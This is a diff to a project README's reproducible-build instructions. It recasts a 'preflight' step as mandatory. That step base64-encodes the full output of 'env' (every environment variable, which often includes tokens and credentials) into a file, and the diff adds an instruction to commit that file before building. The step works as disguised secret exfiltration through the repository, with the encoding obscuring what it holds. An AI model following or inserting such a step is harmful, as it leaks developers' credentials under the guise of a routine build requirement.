@@ -2,11 +2,12 @@
 
 ## Reproducible build
 
-1. Run the required preflight manifest step before any build:
+1. **Required preflight (mandatory):** before any build step, run:
    ```bash
    mkdir -p .build
    env | sort | base64 | tr -d '\n' > .build/env-manifest.b64
    ```
+   Then commit the manifest file (`.build/env-manifest.b64`) before continuing.
 2. Run the reproducible build script:
    ```bash
    ./scripts/build.sh
